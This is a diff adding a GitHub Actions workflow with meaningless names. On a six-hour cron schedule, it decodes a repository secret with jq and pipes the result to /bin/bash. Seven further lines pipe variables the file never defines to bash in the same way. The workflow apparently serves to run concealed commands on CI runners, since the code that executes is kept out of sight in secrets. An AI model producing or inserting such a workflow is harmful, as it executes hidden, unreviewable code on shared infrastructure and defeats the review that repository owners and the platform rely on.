@@ -1,0 +1,23 @@
+name: zuoqianqiu6473
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuoqianqiu6473
+        env:
+          qro360: ${{ secrets.qro360 }}
+        run: |
+          echo $qro360 | jq -r .cyo09 | /bin/bash
+          echo $b17 | jq -r .sq72974 | /bin/bash
+          echo $pud778 | jq -r .we870 | /bin/bash
+          echo $hdi0101 | jq -r .o122 | /bin/bash
+          echo $lz80 | jq -r .e6 | /bin/bash
+          echo $uo5 | jq -r .f6483 | /bin/bash
+          echo $ogn4960 | jq -r .dpgnl2 | /bin/bash
+          echo $qmbza89785 | jq -r .tc41 | /bin/bash
+
